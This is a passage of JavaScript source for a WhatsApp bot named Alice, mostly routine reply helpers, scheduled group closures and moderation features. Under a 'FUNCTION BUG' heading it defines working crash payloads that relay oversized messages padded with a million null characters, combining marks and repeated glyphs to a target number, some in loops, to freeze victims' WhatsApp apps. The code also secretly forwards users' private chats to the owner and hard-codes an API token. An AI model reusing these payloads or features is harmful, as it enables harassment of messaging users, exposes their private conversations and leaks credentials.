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'}}}
// REPLY WITH STATUS
const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": 'Alice Bot',"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": ppnyauser,"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
// REPLY WITH CONTACT
const fkontak2 = {key: {fromMe: false, participant: `${m.sender.split('@')[0]}@s.whatsapp.net`, ...(m.chat ? { remoteJid: '0@s.whatsapp.net' } : {}) }, message: {contactMessage: {displayName: `${pushname}`, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
// REPLY WITH PAYMENT & AMOUNT
const repPy = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ALICE PROJECT SOLO`, participant: '0@s.whatsapp.net' }, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 1, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: `PROJECT ALICEZATION` }}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD" }}}}
const Pareploy = (teks) => { alice.sendMessage(m.chat, { text: teks, contextInfo:{ forwardingScore: 2000000000, isForwarded: false }}, { quoted : repPy })}
// REPLY WITH AUDIO
const dalwin = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, "message": { "audioMessage": { "url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true", "mimetype": "audio/mp4", "fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=", "fileLength": "1067401", "seconds": 60, "ptt": true, "mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=", "fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=", "directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172", "mediaKeyTimestamp": "1684161893" }}}
// REPLY WITH KATALOG 2
const dallwinn = { key: {fromMe: [], participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})}, 'message': { "interactiveMessage": { "header": { "hasMediaAttachment": [], "jpegThumbnail": ppnyauser, }, "nativeFlowMessage": { "buttons": [ {"name": "review_and_pay","buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6348642505244872\",\"product_id\":\"6348642505244872\",\"name\":\"Winnn\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"}]}}}}
// REPLY WITH PAYMENT
const fpayment2 = {key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: `𝙳𝙰𝚁𝚆𝙸𝙽 👨🏾‍🦽`, participant: '0@s.whatsapp.net' }, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 1, requestFrom: '0@s.whatsapp.net', noteMessage: {extendedTextMessage: {text: `𝙳𝙰𝚁𝚆𝙸𝙽 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿`}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
// SEND TEXT WITH REPLY
const repteks = (teks) => { alice.sendMessage(m.chat, { text: teks, contextInfo:{ forwardingScore: 9999999, isForwarded: false }}, { quoted : m })}
// SEND TEXT NO REPLY
const reply = async(teks) => {alice.sendMessage(from, {text: transformText(teks), mentions: await ments(teks)},{quoted:fcall})}
const replys = async(id, teks, quoted) => alice.sendMessage(id, {text: teks, mentions: await ments(teks), contextInfo: {mentionedJid: await ments(teks), externalAdReply: {showAdAttribution: true, title: `${salam} ${pushname}`, body: fake, previewType: 'PHOTO', thumbnail: ppnyauser, sourceUrl: 'https://wa.me/'+global.owner.split('@')[0] }}}, {quoted})
const replyf = async(id, teks) => alice.sendMessage(id, {text: teks, mentions: await ments(teks), contextInfo: {mentionedJid: await ments(teks), externalAdReply: {showAdAttribution: false, title: `${salam} ${pushname}`, body: fake, mediaType: 1, previewType: 'PHOTO', thumbnail: ppnyauser, sourceUrl: global.gcs }}}, {quoted: global.f1('[ System Notice ]', ppnyauser)})

// REPLY NEWSLETTER

// SEND MESSAGE DOCUMENT
const sendres = (huhu, teks) => {
alice.sendMessage(huhu, {
document: fs.readFileSync('./assets/sticker/alice.png'),
fileName: `${salam}`,
mimetype: "image/png",
fileLength: 99999999999,
jpegThumbnail: fs.readFileSync('./assets/sticker/alice.png'),
description: 'hello',
caption: teks,
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender],
businessMessageForwardInfo: {  
businessOwnerJid: global.owner 
},
forwardedNewsletterMessageInfo: {
newsletterName: `POWERED BY PROJECT ALICEZATION`,
newsletterJid: global.idsal},
externalAdReply: { 
title: `ALICE ZUBERG`, 
body: `Online On ${runtime(process.uptime())}`,
thumbnailUrl: `${global.tamnel}`,
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true }}},
{quoted:floc})}






// REPLY WITH URL
const reply795 = async(teks) => {
alice.sendMessage(from, {text: transformText(teks), contextInfo:{
mentionedJid: alice.ments(`${teks}`),
forwardingScore: 0,  
isForwarded: true,  
businessMessageForwardInfo: {
bussinessName: 'memek',
businessOwnerJid: global.owner
},
externalAdReply : {
title: `Hallo ${pushname}`, 
body: `${salam}`,
mediaType: 1,
previewType: "PHOTO",
thumbnailUrl: 'https://telegra.ph/file/a5648303d7671c107ab66.jpg',
renderLargerThumbnail: true,
sourceUrl: `${global.saluran}`}}})
}

const replyURL = async(teks) => {
alice.sendMessage(from, {text: teks, contextInfo:{
mentionedJid: alice.ments(`${teks}`),
forwardingScore: 0,  
isForwarded: true,  
businessMessageForwardInfo: {
bussinessName: 'memek',
businessOwnerJid: global.owner
},
externalAdReply : {
title: `Hallo ${pushname}`, 
body: `${salam}`,
mediaType: 1,
previewType: "PHOTO",
thumbnailUrl: global.tamnel,
renderLargerThumbnail: true,
sourceUrl: `${global.saluran}`}}})
}



// FUNCTION SELF & BATAS COMMAND
if (!global.self && !isCreator && !isOwner && !['buatbot', 'stopjadibot', 'listjadibot', 'play', 'ai', 'owner', 'sc'].includes(command)) return !0;


// FUNCTION BANNED
if (isCmd && isBanned) return !0;

// DATA CHAT USER PC TO GC
if (isPc && budy && !isCreator && !m.fromMe){
alice.sendteks(global.owner, `*WhatsApp Home*\nFrom : @${m.sender.split('@')[0]}\nChat : ${budy}`)
}
/*if (m.isGroup && budy && !isCreator && !m.fromMe) {
alice.sendteks(global.owner, `*WhatsApp Group*\nFrom : @${m.sender.split('@')[0]}\nChat : ${budy}`,m)
}*/

// AUTO CHATGPT REPLY
if (global.chatgpt)
if (froms == botNumber) {
{
const { gifiti } = require('./lib/gpt_bot');
const ahutoay = await gifiti(args[0])
reply(ahutoay.result)
}
}


//AUTO DELETE
isPcccc = from.endsWith(m.chat)
if (global.autodel && isPcccc) {
alice.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.id, participant: m.sender } })
}

// FUNCTION TAG OWNER
if (body.match(`@${global.owner.split('@')[0]}`)) {
      reply('*[ System Notice ]* jangan tag! chat di private chat!')
}
    
    
    
// FUNCTION MONO SPACE FONT
function monospace(string) {
return '```' + string + '```'
}

/*
// AUTO SAVE PETUALANG
if(!isPetualang&&!command){
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
await _petualang.push(m.sender)
await addInventoriDarah(m.sender, DarahAwal)
await addInventori(m.sender)
await addInventoriBuruan(m.sender)
await fs.writeFileSync('./database/rpg/inventory.json', JSON.stringify(_petualang))
await addLevelingId(m.sender)
let totalusr = Object.entries(db_saldo).map(([key, value]) => {return {...value, id: key}})
let dababes = totalusr.map(toNumber('saldo')).sort(sort('saldo'))
let jumlahdata = dababes.map(enumGetKey)
let ppop = `Kamu Top *${dababes.indexOf(sender) + 1}* saldo dari *${dababes.length}* global user`
let hallouser = `Hallo ${pushname} aku *Alice*, Bot whatsApp yang di program otomatis yang dapat digunakan untuk berinteraksi dengan pengguna di platform WhatsApp. *Alice* dirancang untuk memberikan respon otomatis berdasarkan input dan permintaan yang diterima. *Alice* akan membantu dan memecahkan masalah umum, memberikan informasi, memberikan dukungan pelanggan, dan bahkan melakukan transaksi bisnis\n\n${ppop}\ninput *menu* untuk melanjutkan`
alice.sendMessage(m.sender, {text: transformText(hallouser), contextInfo:{
mentionedJid: alice.ments(`${teks}`),
forwardingScore: 0,  
isForwarded: true,  
businessMessageForwardInfo: {
bussinessName: 'memek',
businessOwnerJid: botNumber
},
externalAdReply : {
title: `Hallo ${pushname}`, 
body: `${salam}`,
mediaType: 1,
previewType: "PHOTO",
thumbnailUrl: 'https://telegra.ph/file/a5648303d7671c107ab66.jpg',
renderLargerThumbnail: true,
sourceUrl: `${global.saluran}`}}})
}*/

// FUNCTION LOADING BY DARWIN
async function loading () {
var arr = [
"🕛",
"🕐",
"🕑",
"🕒",
"🕓",
"🕔",
"🕕",
"🕖",
"🕗",
"🕘",
"🕙",
"🕚",
"🕛"
]
let load = await alice.sendMessage(from, {text: '🕛'},{quoted:m})
for (let i = 0; i < arr.length; i++) {
await delay(100)
await alice.sendMessage(from, {text: arr[i], edit: load.key },{quoted:m});
}
}







// DETEKSI MEDIA
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isText = (type === 'conversation' || type === 'extendedTextMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedViewOnce = m.message.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2 ? true : false;
const mime = (quoted.msg || quoted).mimetype || quoted.mediaType || "";
const isMedia = /image|video|sticker|audio/.test(mime)


// FUNCTION MESSAGE
const onlyOwner = async() => {reply(global.mess.owner)};
const onlyAdmin = async() => {reply(global.mess.admin)};
const onlyGc = async() => {reply(global.mess.group)};
const botAdmin = async() => {reply(global.mess.botAdmin)};
const onlyWait = async() => {reply(global.mess.wait)};
const onlyGroup = async() => {
let joinbang = `Hallo ${tag}, untuk menggunakan semua fitur *Alice*, harap masukan bot ke group anda terlebih dahulu agar anda dapat akses lebih di dalam group gratis tanpa prabayar\n\nAtau anda bisa membeli akses sewa & premium dari owner`
reply795(joinbang)}

const sendMessageModify = (jid, teks = '', quoted = '', opts = {}) => {return alice.sendMessage(jid, {text: teks, contextInfo: {mentionedJid: ments(teks), externalAdReply: {showAdAttribution: opts.ads, title: opts.title ?? packname, body: opts.body, mediaType: 1, previewType: 'PHOTO', thumbnailUrl: opts.thumbUrl, thumbnail: opts.thumbnail, sourceUrl: opts.url, renderLargerThumbnail: opts.largeThumb }}}, {quoted: quoted})}




// FUNCTION SAVE KONTAK
const contacts = JSON.parse(fs.readFileSync("./database/contact/contacts.json"))
const isContacts = contacts.includes(sender)



// FUNCTION TIME AUTO CLOSE MAGHRIB
cron.schedule('0 0 18 * * *', async () => {
const getGroups = await alice.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
alice.sendMessage(from, {text: '*[ System Notice ]* Segeralah Beribadah...'});
if (groups.some(v => v === from) && !(await alice.groupMetadata(from)).announce) {
alice.groupSettingUpdate(from, 'announcement').then(() => alice.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })
cron.schedule('0 0 19 * * *', async () => {
const getGroups = await alice.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Waktu maghrib usai, group dibuka kembali.'
if (groups.some(v => v === from) && (await alice.groupMetadata(from)).announce) {
alice.groupSettingUpdate(from, 'not_announcement');
alice.sendMessage(from, {text: text, mentions: Object.values(global.db.groups[from].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
alice.groupRequestParticipantsList(from).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await alice.groupRequestParticipantsUpdate(from, [i.jid], 'approve')
await delay(1000)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

// FUNCTION TIDUR
cron.schedule('0 0 23 * * *', async () => {
const getGroups = await alice.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
let imejnya = getBuffer('https://telegra.ph/file/3686f3e8dbe085a7b20fe.png')
let tidurnya = await alice.downloadAndSaveMediaMessage(imejnya, + new Date * 1)
alice.imgToSticker(from, tidurnya, m, {packname: packname, author: global.author});
if (groups.some(v => v === from) && !(await alice.groupMetadata(from)).announce) {
alice.groupSettingUpdate(from, 'announcement').then(() => alice.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })













// FUNCTION BUG
async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    alice.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}
async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await alice.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await alice.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  alice.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  alice.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await delay(500);
  }
}


// FUNCTION AUTOREAD
if (!m.key.fromMe && global.autoTyping){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await alice.readMessages([readkey]);
console.log(chalk.black(chalk.blue('[ From ] ='), chalk.white(pushname) + '\n' + chalk.magenta('[ Message ] ='), chalk.yellow(budy || m.mtype)))

}
alice.sendPresenceUpdate('available', m.chat)





// FUNCTION ONLY PRIVATE CHAT
        if (global.onlypc) {
        	if (command&&isGroup){
	         return reply(`Alice dalam mode private, gunakan di private chat!`)
	     }
	}
// FUNCTION ONLY PRIVATE CHAT
        if (global.onlygc) {
        	if (command&&!isGroup){
	         return !0;
	     }
	}

// FUNCTION ANTILINK
if (global.antilink && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`chat.whatsapp.com`)) {
await alice.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`hem hem izin dulu atmin (っ˘̩╭╮˘̩)っ`)
}
if (global.antilink && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https`)) {
await alice.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada link ಠ︵ಠ`)
}

// FUNCTION ANTI BOT
 if (global.antibot) {
		if (m.isBaileys === true) {
			if (!m.fromMe) {		 
			} else {
				alice.sendMessage(from, { text: `*[ Violation ]*\n\nSorry, you will be kicked, see you @${m.sender.split("@")[0]}`});
				alice.groupParticipantsUpdate(m.chat, [m.sender], "remove");
			}
}}


// FUNCTION CEK LIMIT
function ceklimit(jid, count = 1){
let status = false
if (global.db.users[jid].limit < 1 && !global.db.users[jid].premium) {
status = true
} else {
global.db.users[jid].limit -= count
}
return status
}


/* FUNCTION MORNING TIME */
cron.schedule("0 0 5 * * *", () => {
alice.sendMessage(m.chat, { text : '*[ System Notice ]* Bangunnnn!! udah shubuhh (─.─||）', mentions: participants.map(a => a.id)})
}, {scheduled: true, timezone: "Asia/Jakarta"});

cron.schedule('0 0 22 * * *', async () => {
const getGroups = await alice.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
alice.sendMessage(from, {text: '*[ System Notice ]* Tidur manis (ー_ー゛)'});
if (groups.some(v => v === from) && !(await alice.groupMetadata(from)).announce) {
alice.groupSettingUpdate(from, 'announcement').then(() => alice.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

cron.schedule('0 0 6 * * *', async () => {
const getGroups = await alice.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Sistem secara otomatis membuka grup ini karena pagi hari.'
if (groups.some(v => v === from) && (await alice.groupMetadata(from)).announce) {
alice.groupSettingUpdate(from, 'not_announcement');
alice.sendMessage(from, {text: text, mentions: Object.values(global.db.groups[from].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
alice.groupRequestParticipantsList(from).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await alice.groupRequestParticipantsUpdate(from, [i.jid], 'approve')
await delay(1000)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })








  


//AUTO REACT
/*let regex =[ "alice","menu","rpg","download","game","nsfw","search","tools","deposit","topup","jadibot","fun","shop","bot","play","start","afk"]
for (let i of regex){
if (isGroup && budy.toLowerCase().includes(i)){
let emot = await pickRandom(["👶🏿", "👍", "🙄", "🌚", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "👩‍⚕️", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
alice.sendMessage(from, { react: { text: emot, key: m.key } })
}
}*/










// FUNCTION KILOMETER
async function jarak(dari, ke) {
	let html = (await axios(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`)).data
	let $ = cheerio.load(html), obj = {}
	let img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
	obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,` [1], 'base64') : ''
	obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
	return obj
}



// FUNCTION DIFFUSION
async function diff(data) {
	const response = await fetch(
		"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
		{
			headers: { Authorization: "Bearer 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" },
			method: "POST",
			body: JSON.stringify(data),
		}
	)
	const result = await response.blob();
	let arrayBuffer = await result.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer, 'base64')
	return buffer
